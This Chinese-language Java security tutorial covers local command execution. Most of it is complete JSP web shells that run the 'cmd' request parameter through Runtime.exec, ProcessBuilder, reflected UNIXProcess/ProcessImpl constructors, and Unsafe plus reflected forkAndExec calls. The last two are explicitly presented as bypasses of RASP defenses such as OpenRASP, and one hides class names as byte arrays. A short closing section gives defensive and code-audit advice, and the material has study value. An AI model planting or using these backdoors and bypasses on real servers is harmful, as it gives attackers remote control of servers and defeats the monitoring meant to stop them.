# Java本地命令执行

Java原生提供了对本地系统命令执行的支持，黑客通常会`RCE利用漏洞`或者`WebShell`来执行系统终端命令控制服务器的目的。

对于开发者来说执行本地命令来实现某些程序功能(如:ps 进程管理、top内存管理等)是一个正常的需求，而对于黑客来说`本地命令执行`是一种非常有利的入侵手段。

## Runtime命令执行

在Java中我们通常会使用`java.lang.Runtime`类的`exec`方法来执行本地系统命令。

![image-20191205181818649](../../images/image-20191205181818649.png?lastModify=1575541613)



### Runtime命令执行测试

runtime-exec2.jsp执行cmd命令示例:**

```jsp
<%=Runtime.getRuntime().exec(request.getParameter("cmd"))%>
```

1. 本地nc监听9000端口:`nc -vv -l 9000`

2. 使用浏览器访问:http://localhost:8080/runtime-exec.jsp?cmd=curl localhost:9000。

   我们可以在nc中看到已经成功的接收到了java执行了`curl`命令的请求了，如此仅需要一行代码一个最简单的本地命令执行后门也就写好了。

![image-20191205180627895](../../images/image-20191205180627895.png)

上面的代码虽然足够简单但是缺少了回显，稍微改下即可实现命令执行的回显了。

**runtime-exec.jsp执行cmd命令示例:**

```jsp
<%=Runtime.getRuntime().exec(request.getParameter("cmd"))%>
<%--
  Created by IntelliJ IDEA.
  User: yz
  Date: 2019/12/5
  Time: 6:21 下午
  To change this template use File | Settings | File Templates.
--%>
<%@ page contentType="text/html;charset=UTF-8" language="java" %>
<%@ page import="java.io.ByteArrayOutputStream" %>
<%@ page import="java.io.InputStream" %>
<%
    InputStream in = Runtime.getRuntime().exec(request.getParameter("cmd")).getInputStream();

    ByteArrayOutputStream baos = new ByteArrayOutputStream();
    byte[] b = new byte[1024];
    int a = -1;

    while ((a = in.read(b)) != -1) {
        baos.write(b, 0, a);
    }

    out.write("<pre>" + new String(baos.toByteArray()) + "</pre>");
%>
```

命令执行效果如下：

![image-20191205182511119](../../images/image-20191205182511119.png)

### Runtime命令执行调用链

`Runtime.exec(xxx)`调用链如下:

```java
java.lang.UNIXProcess.<init>(UNIXProcess.java:247)
java.lang.ProcessImpl.start(ProcessImpl.java:134)
java.lang.ProcessBuilder.start(ProcessBuilder.java:1029)
java.lang.Runtime.exec(Runtime.java:620)
java.lang.Runtime.exec(Runtime.java:450)
java.lang.Runtime.exec(Runtime.java:347)
org.apache.jsp.runtime_002dexec2_jsp._jspService(runtime_002dexec2_jsp.java:118)
```

通过观察整个调用链我们可以清楚的看到`exec`方法并不是命令执行的最终点，执行逻辑大致是：

1. `Runtime.exec(xxx)`
2. `java.lang.ProcessBuilder.start()`
3. `new java.lang.UNIXProcess(xxx)`
4. `UNIXProcess`构造方法中调用了`forkAndExec(xxx)` native方法。
5. `forkAndExec`调用操作系统级别`fork`->`exec`(*nix)/`CreateProcess`(Windows)执行命令并返回`fork`/`CreateProcess`的`PID`。

有了以上的调用链分析我们就可以深刻的理解到Java本地命令执行的深入逻辑了，切记`Runtime`和`ProcessBuilder`并不是程序的最终执行点!

## ProcessBuilder命令执行

学习`Runtime`命令执行的时候我们讲到其最终`exec`方法会调用`ProcessBuilder`来执行本地命令，那么我们只需跟踪下Runtime的exec方法就可以知道如何使用`ProcessBuilder`来执行系统命令了。

**process_builder.jsp命令执行测试**

```jsp
<%--
  Created by IntelliJ IDEA.
  User: yz
  Date: 2019/12/6
  Time: 10:26 上午
  To change this template use File | Settings | File Templates.
--%>
<%@ page contentType="text/html;charset=UTF-8" language="java" %>
<%@ page import="java.io.ByteArrayOutputStream" %>
<%@ page import="java.io.InputStream" %>
<%
    InputStream in = new ProcessBuilder(request.getParameterValues("cmd")).start().getInputStream();
    ByteArrayOutputStream baos = new ByteArrayOutputStream();
    byte[] b = new byte[1024];
    int a = -1;

    while ((a = in.read(b)) != -1) {
        baos.write(b, 0, a);
    }

    out.write("<pre>" + new String(baos.toByteArray()) + "</pre>");
%>
```

执行一个稍微复杂点的命令：`/bin/sh -c "cd /Users/;ls -la;"`,浏览器请求:[http://localhost:8080/process_builder.jsp?cmd=/bin/sh&cmd=-c&cmd=cd%20/Users/;ls%20-la](http://localhost:8080/process_builder.jsp?cmd=/bin/sh&cmd=-c&cmd=cd /Users/;ls -la)

![image-20191206111423261](../../images/image-20191206111423261.png)



## UNIXProcess/ProcessImpl

`UNIXProcess`和`ProcessImpl`可以理解本就是一个东西，因为在JDK9的时候把`UNIXProcess`合并到了`ProcessImpl`当中了,参考[changeset 11315:98eb910c9a97](https://hg.openjdk.java.net/jdk-updates/jdk9u/jdk/rev/98eb910c9a97)。

![image-20191206111948376](../../images/image-20191206111948376.png)

`UNIXProcess`和`ProcessImpl`其实就是最终调用`native`执行系统命令的类，这个类提供了一个叫`forkAndExec`的native方法，如方法名所述主要是通过`fork&exec`来执行本地系统命令。

`UNIXProcess`类的`forkAndExec`示例：

```java
private native int forkAndExec(int mode, byte[] helperpath,
                                   byte[] prog,
                                   byte[] argBlock, int argc,
                                   byte[] envBlock, int envc,
                                   byte[] dir,
                                   int[] fds,
                                   boolean redirectErrorStream)
        throws IOException;
```

最终执行的`Java_java_lang_ProcessImpl_forkAndExec`：

![image-20191206112722220](../../images/image-20191206112722220.png)

`Java_java_lang_ProcessImpl_forkAndExec`完整代码:[ProcessImpl_md.c](https://github.com/unofficial-openjdk/openjdk/blob/e59bd5b27066bb2eb77828110ee585b1598ba636/src/java.base/unix/native/libjava/ProcessImpl_md.c)

很多人对Java本地命令执行的理解不够深入导致了他们无法定位到最终的命令执行点，去年给`OpenRASP`提过这个问题，他们只防御到了`ProcessBuilder.start()`方法，而我们只需要直接调用最终执行的`UNIXProcess/ProcessImpl`实现命令执行或者直接反射`UNIXProcess/ProcessImpl`的`forkAndExec`方法就可以绕过RASP实现命令执行了。

## 反射UNIXProcess/ProcessImpl执行本地命令

**`linux-cmd.jsp`执行本地命令测试:**

```jsp
<%@ page contentType="text/html;charset=UTF-8" language="java" %>
<%@ page import="java.io.*" %>
<%@ page import="java.lang.reflect.Constructor" %>
<%@ page import="java.lang.reflect.Method" %>

<%!
    byte[] toCString(String s) {
        if (s == null) {
            return null;
        }

        byte[] bytes  = s.getBytes();
        byte[] result = new byte[bytes.length + 1];
        System.arraycopy(bytes, 0, result, 0, bytes.length);
        result[result.length - 1] = (byte) 0;
        return result;
    }

    InputStream start(String[] strs) throws Exception {
        // java.lang.UNIXProcess
        String unixClass = new String(new byte[]{106, 97, 118, 97, 46, 108, 97, 110, 103, 46, 85, 78, 73, 88, 80, 114, 111, 99, 101, 115, 115});

        // java.lang.ProcessImpl
        String processClass = new String(new byte[]{106, 97, 118, 97, 46, 108, 97, 110, 103, 46, 80, 114, 111, 99, 101, 115, 115, 73, 109, 112, 108});

        Class clazz = null;

        // 反射创建UNIXProcess或者ProcessImpl
        try {
            clazz = Class.forName(unixClass);
        } catch (ClassNotFoundException e) {
            clazz = Class.forName(processClass);
        }

        // 获取UNIXProcess或者ProcessImpl的构造方法
        Constructor<?> constructor = clazz.getDeclaredConstructors()[0];
        constructor.setAccessible(true);

        assert strs != null && strs.length > 0;

        // Convert arguments to a contiguous block; it's easier to do
        // memory management in Java than in C.
        byte[][] args = new byte[strs.length - 1][];

        int size = args.length; // For added NUL bytes
        for (int i = 0; i < args.length; i++) {
            args[i] = strs[i + 1].getBytes();
            size += args[i].length;
        }

        byte[] argBlock = new byte[size];
        int    i        = 0;

        for (byte[] arg : args) {
            System.arraycopy(arg, 0, argBlock, i, arg.length);
            i += arg.length + 1;
            // No need to write NUL bytes explicitly
        }

        int[] envc    = new int[1];
        int[] std_fds = new int[]{-1, -1, -1};

        FileInputStream  f0 = null;
        FileOutputStream f1 = null;
        FileOutputStream f2 = null;

        // In theory, close() can throw IOException
        // (although it is rather unlikely to happen here)
        try {
            if (f0 != null) f0.close();
        } finally {
            try {
                if (f1 != null) f1.close();
            } finally {
                if (f2 != null) f2.close();
            }
        }

        // 创建UNIXProcess或者ProcessImpl实例
        Object object = constructor.newInstance(
                toCString(strs[0]), argBlock, args.length,
                null, envc[0], null, std_fds, false
        );

        // 获取命令执行的InputStream
        Method inMethod = object.getClass().getDeclaredMethod("getInputStream");
        inMethod.setAccessible(true);

        return (InputStream) inMethod.invoke(object);
    }

    String inputStreamToString(InputStream in, String charset) throws IOException {
        try {
            if (charset == null) {
                charset = "UTF-8";
            }

            ByteArrayOutputStream out = new ByteArrayOutputStream();
            int                   a   = 0;
            byte[]                b   = new byte[1024];

            while ((a = in.read(b)) != -1) {
                out.write(b, 0, a);
            }

            return new String(out.toByteArray());
        } catch (IOException e) {
            throw e;
        } finally {
            if (in != null)
                in.close();
        }
    }
%>
<%
    String[] str = request.getParameterValues("cmd");

    if (str != null) {
        InputStream in     = start(str);
        String      result = inputStreamToString(in, "UTF-8");
        out.println("<pre>");
        out.println(result);
        out.println("</pre>");
        out.flush();
        out.close();
    }
%>
```

命令执行效果如下：

![image-20191206135626282](../../images/image-20191206135626282.png)

Windows可能并不适用，稍做调整应该就可以了。



## forkAndExec命令执行-Unsafe+反射+Native方法调用

如果`RASP`把`UNIXProcess/ProcessImpl`类的构造方法给拦截了我们是不是就无法执行本地命令了？其实我们可以利用Java的几个特性就可以绕过RASP执行本地命令了，具体步骤如下:

1. 使用`sun.misc.Unsafe.allocateInstance(Class)`特性可以无需`new`或者`newInstance`创建`UNIXProcess/ProcessImpl`类对象。
2. 反射`UNIXProcess/ProcessImpl`类的`forkAndExec`方法。
3. 构造`forkAndExec`需要的参数并调用。
4. 反射`UNIXProcess/ProcessImpl`类的`initStreams`方法初始化输入输出结果流对象、`getInputStream`。
5. 反射`UNIXProcess/ProcessImpl`类的`getInputStream`方法获取本地命令执行结果(如果要输出流、异常流反射对应方法即可)。

**`fork_and_exec.jsp`执行本地命令示例:**

```jsp
<%@ page contentType="text/html;charset=UTF-8" language="java" %>
<%@ page import="sun.misc.Unsafe" %>
<%@ page import="java.io.ByteArrayOutputStream" %>
<%@ page import="java.io.InputStream" %>
<%@ page import="java.lang.reflect.Field" %>
<%@ page import="java.lang.reflect.Method" %>
<%!
    byte[] toCString(String s) {
        if (s == null)
            return null;
        byte[] bytes  = s.getBytes();
        byte[] result = new byte[bytes.length + 1];
        System.arraycopy(bytes, 0,
                result, 0,
                bytes.length);
        result[result.length - 1] = (byte) 0;
        return result;
    }


%>
<%
    String[] strs = request.getParameterValues("cmd");

    if (strs != null) {
        Field theUnsafeField = Unsafe.class.getDeclaredField("theUnsafe");
        theUnsafeField.setAccessible(true);
        Unsafe unsafe = (Unsafe) theUnsafeField.get(null);

        Class processClass = null;

        try {
            processClass = Class.forName("java.lang.UNIXProcess");
        } catch (ClassNotFoundException e) {
            processClass = Class.forName("java.lang.ProcessImpl");
        }

        Object processObject = unsafe.allocateInstance(processClass);

        // Convert arguments to a contiguous block; it's easier to do
        // memory management in Java than in C.
        byte[][] args = new byte[strs.length - 1][];
        int      size = args.length; // For added NUL bytes

        for (int i = 0; i < args.length; i++) {
            args[i] = strs[i + 1].getBytes();
            size += args[i].length;
        }

        byte[] argBlock = new byte[size];
        int    i        = 0;

        for (byte[] arg : args) {
            System.arraycopy(arg, 0, argBlock, i, arg.length);
            i += arg.length + 1;
            // No need to write NUL bytes explicitly
        }

        int[] envc                 = new int[1];
        int[] std_fds              = new int[]{-1, -1, -1};
        Field launchMechanismField = processClass.getDeclaredField("launchMechanism");
        Field helperpathField      = processClass.getDeclaredField("helperpath");
        launchMechanismField.setAccessible(true);
        helperpathField.setAccessible(true);
        Object launchMechanismObject = launchMechanismField.get(processObject);
        byte[] helperpathObject      = (byte[]) helperpathField.get(processObject);

        int ordinal = (int) launchMechanismObject.getClass().getMethod("ordinal").invoke(launchMechanismObject);

        Method forkMethod = processClass.getDeclaredMethod("forkAndExec", new Class[]{
                int.class, byte[].class, byte[].class, byte[].class, int.class,
                byte[].class, int.class, byte[].class, int[].class, boolean.class
        });

        forkMethod.setAccessible(true);// 设置访问权限

        int pid = (int) forkMethod.invoke(processObject, new Object[]{
                ordinal + 1, helperpathObject, toCString(strs[0]), argBlock, args.length,
                null, envc[0], null, std_fds, false
        });

        // 初始化命令执行结果，将本地命令执行的输出流转换为程序执行结果的输出流
        Method initStreamsMethod = processClass.getDeclaredMethod("initStreams", int[].class);
        initStreamsMethod.setAccessible(true);
        initStreamsMethod.invoke(processObject, std_fds);

        // 获取本地执行结果的输入流
        Method getInputStreamMethod = processClass.getMethod("getInputStream");
        getInputStreamMethod.setAccessible(true);
        InputStream in = (InputStream) getInputStreamMethod.invoke(processObject);

        ByteArrayOutputStream baos = new ByteArrayOutputStream();
        int                   a    = 0;
        byte[]                b    = new byte[1024];

        while ((a = in.read(b)) != -1) {
            baos.write(b, 0, a);
        }

        out.println("<pre>");
        out.println(baos.toString());
        out.println("</pre>");
        out.flush();
        out.close();
    }
%>
```

命令执行效果如下：

![image-20191206153815471](../../images/image-20191206153815471.png)



## JNI命令执行

Java可以通过JNI的方式调用动态链接库，我们只需要在动态链接库中写写一个本地命令执行的方法就行了。



## Java本地命令执行总结

Java本地命令执行是一个非常高危的漏洞，一旦被攻击者利用后果不堪设想。这个漏洞原理一样是非常简单且容易被发现。开发阶段我们应该尽可能的避免调用本地命令接口，如果不得不调用那么请仔细检查命令执行参数，严格检查(防止命令注入)或严禁用户直接传入命令！代码审计阶段我们应该多搜索下`Runtime.exec/ProcessBuilder/ProcessImpl`等关键词，这样可以快速找出命令执行点。